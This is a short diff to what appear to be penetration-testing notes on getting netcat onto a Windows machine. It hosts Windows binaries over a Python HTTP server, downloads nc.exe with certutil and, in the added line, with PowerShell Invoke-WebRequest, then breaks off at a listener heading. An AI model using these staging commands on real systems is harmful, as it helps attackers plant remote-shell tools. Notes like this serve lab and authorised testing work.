@@ -16,6 +16,7 @@ Transfer netcat to Windows.
 1. Inside `/usr/share/windows-binaries/` : go to folder
 2. `python -m SimpleHTTPServer 80` : set up hosting of the files for DL on Win
 3. `certutil -urlcache -f http://<IP>/nc.exe nc.exe` : download using windows utility and save to file "nc.exe"
+4. `powershell -c "Invoke-WebRequest -Uri <URL> -OutFile <FILENAME>"`
 
 Listener
 ```bash
